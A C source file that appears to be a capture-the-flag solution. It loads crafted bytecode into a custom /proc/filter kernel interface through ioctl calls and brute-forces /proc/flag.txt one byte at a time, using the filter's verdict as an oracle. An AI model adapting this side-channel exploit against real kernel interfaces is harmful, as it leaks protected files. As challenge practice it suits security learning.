#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>

#define SET_PROGRAM_CMD 0x40086601
#define SHOULD_DROP_CMD 0x40086602

struct program_data {
    void* program;
    size_t size;
};

uint32_t make_insn(uint8_t opcode, uint8_t src_reg, uint8_t dst_reg, uint16_t imm) {
    return opcode | (src_reg << 8) | (dst_reg << 12) | (imm << 16);
}

int main() {
    int fd = open("/proc/filter", O_RDWR);
    if (fd < 0) {
        perror("open /proc/filter");
        return 1;
    }

    printf("[+] Opened /proc/filter\n");

    // Read flag byte by byte - simpler approach
    char flag[256] = {0};
    int flag_len = 0;
    
    for (int offset = 0; offset < 100; offset++) {
        printf("[+] Reading byte at offset %d\n", offset);
        uint8_t byte_val = 0;
        
        // Check each possible byte value (0-255)
        for (int test_val = 1; test_val <= 255; test_val++) {
            // Program to check if byte at offset equals test_val
            uint32_t program[] = {
                // Load byte from buffer[offset] into r1
                make_insn(0x2b, 0, 1, offset),
                
                // Compare r1 with immediate test_val, result in flags
                make_insn(0x17, 0, 1, test_val),
                
                // If equal flag is set, return 1
                make_insn(0x1c, 0, 0, 4), // Jump to instruction 4 if equal
                
                // Otherwise return 0
                make_insn(0x00, 0, 0, 0),
                
                // Return 1 (equal)
                make_insn(0x01, 0, 0, 0)
            };
            
            struct program_data prog = {
                .program = program,
                .size = sizeof(program)
            };
            
            if (ioctl(fd, SET_PROGRAM_CMD, &prog) < 0) {
                perror("set_program");
                goto cleanup;
            }
            
            char filename[] = "/flag.txt";
            int result = ioctl(fd, SHOULD_DROP_CMD, filename);
            
            // if (result < 0) {
            //     printf("[-] Error testing value %d at offset %d: %d\n", test_val, offset, result);
            //     continue;
            // }
            
            if (result != 0) {
                byte_val = test_val;
                printf("  Found byte: 0x%02x ('%c')\n", byte_val, 
                       (byte_val >= 32 && byte_val < 127) ? byte_val : '.');
                break;
            }
        }
        
        if (byte_val == 0) {
            printf("  Byte is 0 or not found, stopping\n");
            break; // End of file or couldn't read
        }
        
        flag[flag_len++] = byte_val;
        
        if (byte_val == '\n') {
            break;
        }
    }
    
    printf("\n[+] Flag: %s\n", flag);

cleanup:
    close(fd);
    return 0;
}